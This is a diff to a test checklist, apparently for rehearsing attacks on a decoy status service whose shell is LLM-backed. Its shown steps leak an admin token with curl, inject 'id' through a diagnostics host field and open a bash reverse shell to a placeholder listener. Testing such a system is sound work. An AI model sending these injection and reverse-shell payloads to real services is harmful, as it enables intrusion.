@@ -107,7 +107,7 @@ profiles:
 ```sh
 T=http://<akash-uri>
 curl -s $T/api/env                                   # leaks ADMIN_TOKEN
-TOKEN=synthetic_token_not_valid_anywhere
+TOKEN=hw_admin_5f2c9e1a7b3d4c86
 curl -s -X POST $T/api/admin/diagnostics -H "authorization: Bearer $TOKEN" \
      -H 'content-type: application/json' -d '{"host":"8.8.8.8; id"}'
 # listener running (step 4), then:
@@ -115,7 +115,7 @@ curl -s -X POST $T/api/admin/diagnostics -H "authorization: Bearer $TOKEN" \
      -H 'content-type: application/json' \
      -d "{\"host\":\"x; bash -c 'bash -i >& /dev/tcp/<LISTENER_IP>/<PORT> 0>&1'\"}"
 ```
-- [ ] The listener prints `connection received`, the bash banner and a `node@acme-status-7f9c4:/app$` prompt.
+- [ ] The listener prints `connection received`, the bash banner and a `node@hivewell-status-7f9c4:/app$` prompt.
 - [ ] Commands get answers; `served_by` shows `fast_path` and `guild` (or `llm`) in ClickHouse.
 - [ ] `npm run analyze -- <session_id>` returns a Guild summary for that session.
 - [ ] The rehearser hasn't read `packages/shell/world.json`. Every "that looks fake" moment goes to the shell-brain owner.
